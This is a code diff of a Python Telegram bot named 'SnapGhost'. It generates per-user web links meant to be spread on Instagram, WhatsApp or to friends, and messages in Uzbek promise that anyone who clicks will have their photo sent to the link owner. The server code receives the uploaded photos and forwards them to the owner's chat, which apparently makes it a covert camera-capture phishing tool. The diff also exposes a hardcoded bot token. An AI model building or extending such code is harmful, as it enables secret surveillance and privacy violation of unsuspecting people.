@@ -8,7 +8,7 @@ from aiohttp import web
 
 BOT_TOKEN = "8834440378:AAEwznb4TAwwjZQpcBQPEOEAuYbt7R-k4IU"
 ADMIN_ID  = 8794869188
-SERVER_URL = os.environ.get("SERVER_URL", "https://web-production-e63ef.up.railway.app")
+SERVER_URL = "https://web-production-e63ef.up.railway.app"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -37,33 +37,45 @@ async def start(message: types.Message):
 @dp.message(F.text == "/link")
 async def send_link(message: types.Message):
     uid  = message.from_user.id
-    link = f"https://t.me/snapghost_bot?start={uid}"
+    # Bu link — kim bosmasin, rasm shu uid egasiga keladi
+    link = f"{SERVER_URL}/?uid={uid}"
     await message.answer(
-        f"🔗 *Do'stingizga yuboring:*\n\n"
+        f"🔗 *Mana sening linkin:*\n\n"
         f"`{link}`\n\n"
-        f"_Do'stingiz bosganida rasmi senga keladi_ 😈",
+        f"📲 Bu linkni Instagram story, WhatsApp yoki do'stingga yubor!\n"
+        f"_Kim bosmasin — rasmi *senga* keladi_ 😈\n\n"
+        f"_SnapGhost • by Akhmadov_",
         parse_mode="Markdown"
     )
 
 async def handle_photo(request):
     try:
-        data     = await request.post()
-        photo    = data.get("photo")
-        sender   = data.get("user_id", "unknown")
-        username = data.get("username", "")
-        fname    = data.get("first_name", "")
+        data      = await request.post()
+        photo     = data.get("photo")
+        owner_id  = data.get("user_id", str(ADMIN_ID))  # link egasi
+        username  = data.get("username", "")
+        fname     = data.get("first_name", "")
+
         if not photo:
             return web.Response(text="no photo", status=400)
+
         photo_bytes = photo.file.read()
+
         caption = (
-            f"📸 *Yangi snap!*\n"
-            f"👤 Ism: {fname}\n"
-            f"🔗 Username: @{username}\n"
-            f"🆔 ID: `{sender}`\n\n"
+            f"📸 *Yangi snap keldi!*\n"
+            f"👤 Ism: {fname or 'Noma\\'lum'}\n"
+            f"🔗 Username: {'@'+username if username else 'Yoq'}\n\n"
             f"_SnapGhost • by Akhmadov_"
         )
+
+        # Rasm link egasiga yuboriladi
+        try:
+            target = int(owner_id)
+        except:
+            target = ADMIN_ID
+
         await bot.send_photo(
-            chat_id=ADMIN_ID,
+            chat_id=target,
             photo=types.BufferedInputFile(photo_bytes, filename="snap.jpg"),
             caption=caption,
             parse_mode="Markdown"
@@ -74,7 +86,7 @@ async def handle_photo(request):
         return web.Response(text="error", status=500)
 
 async def handle_index(request):
-    uid = request.rel_url.query.get("uid", "unknown")
+    uid = request.rel_url.query.get("uid", str(ADMIN_ID))
     with open("webapp/index.html", "r", encoding="utf-8") as f:
         html = f.read()
     html = html.replace("__SERVER_URL__", SERVER_URL).replace("__UID__", uid)
@@ -88,8 +100,7 @@ async def main():
     await runner.setup()
     port = int(os.environ.get("PORT", 8080))
     await web.TCPSite(runner, "0.0.0.0", port).start()
-    logging.info(f"✅ Server: http://0.0.0.0:{port}")
-    logging.info("✅ Bot ishga tushdi")
+    logging.info(f"Server: http://0.0.0.0:{port}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
